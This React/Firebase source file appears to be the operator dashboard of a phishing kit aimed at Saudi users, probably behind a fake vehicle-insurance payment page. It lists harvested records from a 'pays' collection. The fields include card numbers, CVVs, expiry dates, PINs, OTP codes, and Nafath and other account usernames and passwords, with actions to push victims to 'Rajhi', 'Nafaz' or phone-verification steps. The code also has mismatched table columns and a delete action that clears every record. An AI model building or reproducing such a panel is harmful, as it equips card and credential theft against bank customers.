"use client"
import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import {
  Trash2,
  LogOut,
  CreditCard,
  User,
  Car,
  Shield,
  CreditCardIcon as CardIcon,
  MoreHorizontal,
  Tag,
  Bell,
  Loader2,
  RefreshCw,
  Smartphone,
  LayoutDashboard,
  Settings,
  Users,
  Activity,
  ChevronDown,
} from "lucide-react"

import { Button } from "@/components/ui/button"
import { Badge } from "@/components/ui/badge"
import { Toaster, toast } from "sonner"
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogFooter,
} from "@/components/ui/dialog"
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import { Input } from "@/components/ui/input"
import {
  Sidebar,
  SidebarContent,
  SidebarFooter,
  SidebarGroup,
  SidebarGroupContent,
  SidebarGroupLabel,
  SidebarHeader,
  SidebarMenu,
  SidebarMenuButton,
  SidebarMenuItem,
  SidebarProvider,
} from "@/components/ui/sidebar"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { collection, doc, writeBatch, updateDoc, onSnapshot, query, orderBy } from "firebase/firestore"
import { onAuthStateChanged } from "firebase/auth"
import { NotificationDocument, auth, db } from "@/lib/firestore"
import { playNotificationSound } from "@/lib/actions"

// Keep all the original interfaces
interface PaymentData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  full_name?: string
}

interface FormData {
  card_number?: string
  cvv?: string
  expiration_date?: string
  card_holder_name?: string
}

interface Notification {
  id: string
  agreeToTerms?: boolean
  card_holder_name?: string
  buyer_identity_number?: string
  card_number?: string
  cardNumber?: string
  createdDate: string
  customs_code?: string
  cvv?: string
  document_owner_full_name?: string
  expiration_date?: string
  formData?: FormData
  full_name?: string
  createdAt?: string
  insurance_purpose?: string
  owner_identity_number?: string
  pagename?: string
  paymentData?: PaymentData
  paymentStatus?: string
  phone?: string
  phone2?: string
  seller_identity_number?: string
  serial_number?: string
  status?: string
  vehicle_manufacture_number?: string
  documment_owner_full_name?: string
  vehicle_type?: string
  isHidden?: boolean
  pinCode?: string
  otpCardCode?: string
  phoneOtp?: string
  otpCode?: string
  externalUsername?: string
  externalPassword?: string
  nafadUsername?: string
  nafadPassword?: string
  nafaz_pin?: string
  autnAttachment?: string
  requierdAttachment?: string
  operator?: string
  otpPhoneStatus: string
  phoneOtpCode: string
  phoneVerificationStatus: string
  country?: string
}

// Sidebar navigation items
const navigationItems = [
  {
    title: "لوحة التحكم",
    url: "#",
    icon: LayoutDashboard,
    isActive: true,
  },
  {
    title: "المستخدمين",
    url: "#",
    icon: Users,
  },
  {
    title: "المدفوعات",
    url: "#",
    icon: CreditCard,
  },
  {
    title: "التقارير",
    url: "#",
    icon: Activity,
  },
  {
    title: "الإعدادات",
    url: "#",
    icon: Settings,
  },
]

function AppSidebar() {
  return (
    <Sidebar variant="sidebar" side="right">
      <SidebarHeader>
        <SidebarMenu>
          <SidebarMenuItem>
            <SidebarMenuButton size="lg" asChild>
              <a href="#" className="flex items-center gap-2">
                <div className="flex aspect-square size-8 items-center justify-center rounded-lg bg-sidebar-primary text-sidebar-primary-foreground">
                  <LayoutDashboard className="size-4" />
                </div>
                <div className="grid flex-1 text-left text-sm leading-tight">
                  <span className="truncate font-semibold">لوحة الإدارة</span>
                  <span className="truncate text-xs">نظام إدارة البيانات</span>
                </div>
              </a>
            </SidebarMenuButton>
          </SidebarMenuItem>
        </SidebarMenu>
      </SidebarHeader>
      <SidebarContent>
        <SidebarGroup>
          <SidebarGroupLabel>التنقل الرئيسي</SidebarGroupLabel>
          <SidebarGroupContent>
            <SidebarMenu>
              {navigationItems.map((item) => (
                <SidebarMenuItem key={item.title}>
                  <SidebarMenuButton asChild isActive={item.isActive}>
                    <a href={item.url}>
                      <item.icon />
                      <span>{item.title}</span>
                    </a>
                  </SidebarMenuButton>
                </SidebarMenuItem>
              ))}
            </SidebarMenu>
          </SidebarGroupContent>
        </SidebarGroup>
      </SidebarContent>
      <SidebarFooter>
        <SidebarMenu>
          <SidebarMenuItem>
            <DropdownMenu>
              <DropdownMenuTrigger asChild>
                <SidebarMenuButton
                  size="lg"
                  className="data-[state=open]:bg-sidebar-accent data-[state=open]:text-sidebar-accent-foreground"
                >
                  <Avatar className="h-8 w-8 rounded-lg">
                    <AvatarImage src="/placeholder.svg?height=32&width=32" alt="المدير" />
                    <AvatarFallback className="rounded-lg">مد</AvatarFallback>
                  </Avatar>
                  <div className="grid flex-1 text-left text-sm leading-tight">
                    <span className="truncate font-semibold">المدير </span>
                    <span className="truncate text-xs">admin@admin.com</span>
                  </div>
                  <ChevronDown className="ml-auto size-4" />
                </SidebarMenuButton>
              </DropdownMenuTrigger>
              <DropdownMenuContent
                className="w-(--radix-dropdown-menu-trigger-width) min-w-56 rounded-lg"
                side="bottom"
                align="end"
                sideOffset={4}
              >
                <DropdownMenuLabel className="p-0 font-normal">
                  <div className="flex items-center gap-2 px-1 py-1.5 text-left text-sm">
                    <Avatar className="h-8 w-8 rounded-lg">
                      <AvatarImage src="/placeholder.svg?height=32&width=32" alt="المدير" />
                      <AvatarFallback className="rounded-lg">مد</AvatarFallback>
                    </Avatar>
                    <div className="grid flex-1 text-left text-sm leading-tight">
                      <span className="truncate font-semibold">المدير </span>
                      <span className="truncate text-xs">admin@admin.com</span>
                    </div>
                  </div>
                </DropdownMenuLabel>
                <DropdownMenuSeparator />
                <DropdownMenuItem>
                  <Settings className="mr-2 h-4 w-4" />
                  الإعدادات
                </DropdownMenuItem>
                <DropdownMenuItem>
                  <LogOut className="mr-2 h-4 w-4" />
                  تسجيل الخروج
                </DropdownMenuItem>
              </DropdownMenuContent>
            </DropdownMenu>
          </SidebarMenuItem>
        </SidebarMenu>
      </SidebarFooter>
    </Sidebar>
  )
}

export default function NotificationsPage() {
  const [notifications, setNotifications] = useState<NotificationDocument[]>([])
  const [filteredNotifications, setFilteredNotifications] = useState<NotificationDocument[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [selectedInfo, setSelectedInfo] = useState<"personal" | "card" | "vehicle" | null>(null)
  const [selectedNotification, setSelectedNotification] = useState<NotificationDocument | null>(null)
  const [activeFilter, setActiveFilter] = useState<string | null>(null)
  const [showSidebar, setShowSidebar] = useState(false)
  const [sortOrder, setSortOrder] = useState<"newest" | "oldest">("newest")
  const [showCardDialog, setShowCardDialog] = useState(false)
  const [selectedCardInfo, setSelectedCardInfo] = useState<NotificationDocument | null>(null)
  const [showPagenameDialog, setShowPagenameDialog] = useState(false)
  const [uniquePagenames, setUniquePagenames] = useState<string[]>([])
  const [showRajhiDialog, setShowRajhiDialog] = useState(false)
  const [showNafazDialog, setShowNafazDialog] = useState(false)
  const [showPhoneDialog, setPhoneDialog] = useState(false)

  const router = useRouter()

  // Real Firebase functions from original code
  const updateAttachment = async (id: string, attachmentType: string, value: string) => {
    try {
      const targetPost = doc(db, "pays", id)
      await updateDoc(targetPost, {
        [attachmentType]: value,
      })
      playNotificationSound()
      toast.success("تم تحديث المرفق بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error updating attachment:", error)
      toast.error("حدث خطأ أثناء تحديث المرفق", {
        position: "top-center",
        duration: 2000,
      })
    }
  }

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (!user) {
        router.push("/login")
      } else {
        const unsubscribeNotifications = fetchNotifications()
        return () => {
          unsubscribeNotifications()
        }
      }
    })
    return () => unsubscribe()
  }, [router])

  useEffect(() => {
    if (searchTerm.trim() === "" && !activeFilter) {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        const matchesSearch =
          searchTerm.trim() === "" ||
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.card_number?.includes(searchTerm)

        const matchesFilter =
          !activeFilter ||
          (activeFilter === "pending" && (!notification.status || notification.status === "pending")) ||
          (activeFilter === "approved" && notification.status === "approved") ||
          (activeFilter === "rejected" && notification.status === "rejected") ||
          (activeFilter === "payment" && notification.pagename === "payment") ||
          (activeFilter === "registration" && notification.vehicle_type === "registration")

        return matchesSearch && matchesFilter
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications, activeFilter])

  useEffect(() => {
    if (notifications.length > 0) {
      const pagenames = notifications
        .map((notification) => notification.pagename)
        .filter((pagename): pagename is string => !!pagename)
      const uniqueNames = Array.from(new Set(pagenames))
      setUniquePagenames(uniqueNames)
    }
  }, [notifications])

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]
        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
        playNotificationSound()
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )
    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      playNotificationSound()
      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    }, 1000)
    return unsubscribe
  }

  const handleClearAll = async () => {
    setIsLoading(true)
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        batch.update(doc(db, "pays", notification.id), { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      playNotificationSound()
      toast.success("تم مسح جميع الإشعارات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    } catch (error) {
      console.error("Error clearing all notifications:", error)
      toast.error("حدث خطأ أثناء مسح جميع الإشعارات", {
        position: "top-center",
        duration: 2000,
      })
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <SidebarProvider className="flex">
      <AppSidebar />
      <div className="flex-1 p-4">
        <Toaster />
        <div className="flex items-center justify-between">
          <Input
            type="text"
            placeholder="بحث..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="mb-4"
          />
          <Button onClick={refreshData} className="mb-4">
            {isRefreshing ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <RefreshCw className="mr-2 h-4 w-4" />}
            تحديث البيانات
          </Button>
        </div>
        <Table>
          <TableHeader>
            <TableRow>
              <TableHead>الاسم</TableHead>
              <TableHead>رقم الهاتف</TableHead>
              <TableHead>رقم البطاقة</TableHead>
              <TableHead>الحالة</TableHead>
              <TableHead>الإجراءات</TableHead>
            </TableRow>
          </TableHeader>
          <TableBody>
            {filteredNotifications.map((notification) => (
              <TableRow key={notification.id}>
                <TableCell>{notification?.country|| "لا يوجد اسم "}</TableCell>
                <TableCell>{notification.documment_owner_full_name|| "لا يوجد اسم "}</TableCell>
                <TableCell>{notification.phone2}</TableCell>
                <TableCell>{notification.card_number}</TableCell>
                <TableCell>
                  <Badge
                    variant={
                      notification.status === "approved"
                        ? "default"
                        : notification.status === "rejected"
                          ? "destructive"
                          : "secondary"
                    }
                  >
                    {notification.status || "قيد الانتظار"}
                  </Badge>
                </TableCell>
                <TableCell>
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="ghost">
                        <MoreHorizontal className="h-4 w-4" />
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent className="w-56">
                      <DropdownMenuItem onClick={() => setSelectedInfo("personal")}>
                        <User className="mr-2 h-4 w-4" />
                        معلومات المستخدم
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSelectedInfo("card")}>
                        <CreditCard className="mr-2 h-4 w-4" />
                        معلومات البطاقة
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setSelectedInfo("vehicle")}>
                        <Car className="mr-2 h-4 w-4" />
                        معلومات السيارة
                      </DropdownMenuItem>
                      <DropdownMenuSeparator />
                      <DropdownMenuItem onClick={() => setShowCardDialog(true)}>
                        <CardIcon className="mr-2 h-4 w-4" />
                        تحديث البطاقة
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setShowPagenameDialog(true)}>
                        <Tag className="mr-2 h-4 w-4" />
                        تحديث الصفحة
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setShowRajhiDialog(true)}>
                        <Shield className="mr-2 h-4 w-4" />
                        تحديث راجحي
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setShowNafazDialog(true)}>
                        <Bell className="mr-2 h-4 w-4" />
                        تحديث نافاز
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => setPhoneDialog(true)}>
                        <Smartphone className="mr-2 h-4 w-4" />
                        تحديث الهاتف
                      </DropdownMenuItem>
                      <DropdownMenuSeparator />
                      <DropdownMenuItem onClick={() => setSelectedNotification(notification)}>
                        <Trash2 className="mr-2 h-4 w-4" />
                        مسح الإشعار
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </TableCell>
              </TableRow>
            ))}
          </TableBody>
        </Table>
        {selectedNotification && (
          <Dialog open={!!selectedNotification} onOpenChange={() => setSelectedNotification(null)}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>مسح الإشعار</DialogTitle>
                <DialogDescription>هل أنت متأكد من أنك تريد مسح هذا الإشعار؟</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setSelectedNotification(null)}>
                  إلغاء
                </Button>
                <Button variant="destructive" onClick={() => handleClearAll()}>
                  مسح
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
        {showCardDialog && (
          <Dialog open={showCardDialog} onOpenChange={setShowCardDialog}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>تحديث البطاقة</DialogTitle>
                <DialogDescription>يمكنك تحديث معلومات البطاقة هنا.</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setShowCardDialog(false)}>
                  إلغاء
                </Button>
                <Button variant="default" onClick={() => setShowCardDialog(false)}>
                  تحديث
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
        {showPagenameDialog && (
          <Dialog open={showPagenameDialog} onOpenChange={setShowPagenameDialog}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>تحديث الصفحة</DialogTitle>
                <DialogDescription>يمكنك تحديث اسم الصفحة هنا.</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setShowPagenameDialog(false)}>
                  إلغاء
                </Button>
                <Button variant="default" onClick={() => setShowPagenameDialog(false)}>
                  تحديث
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
        {showRajhiDialog && (
          <Dialog open={showRajhiDialog} onOpenChange={setShowRajhiDialog}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>تحديث راجحي</DialogTitle>
                <DialogDescription>يمكنك تحديث راجحي هنا.</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setShowRajhiDialog(false)}>
                  إلغاء
                </Button>
                <Button variant="default" onClick={() => setShowRajhiDialog(false)}>
                  تحديث
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
        {showNafazDialog && (
          <Dialog open={showNafazDialog} onOpenChange={setShowNafazDialog}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>تحديث نافاز</DialogTitle>
                <DialogDescription>يمكنك تحديث نافاز هنا.</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setShowNafazDialog(false)}>
                  إلغاء
                </Button>
                <Button variant="default" onClick={() => setShowNafazDialog(false)}>
                  تحديث
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
        {showPhoneDialog && (
          <Dialog open={showPhoneDialog} onOpenChange={setPhoneDialog}>
            <DialogContent>
              <DialogHeader>
                <DialogTitle>تحديث الهاتف</DialogTitle>
                <DialogDescription>يمكنك تحديث الهاتف هنا.</DialogDescription>
              </DialogHeader>
              <DialogFooter>
                <Button variant="outline" onClick={() => setPhoneDialog(false)}>
                  إلغاء
                </Button>
                <Button variant="default" onClick={() => setPhoneDialog(false)}>
                  تحديث
                </Button>
              </DialogFooter>
            </DialogContent>
          </Dialog>
        )}
      </div>
    </SidebarProvider>
  )
}
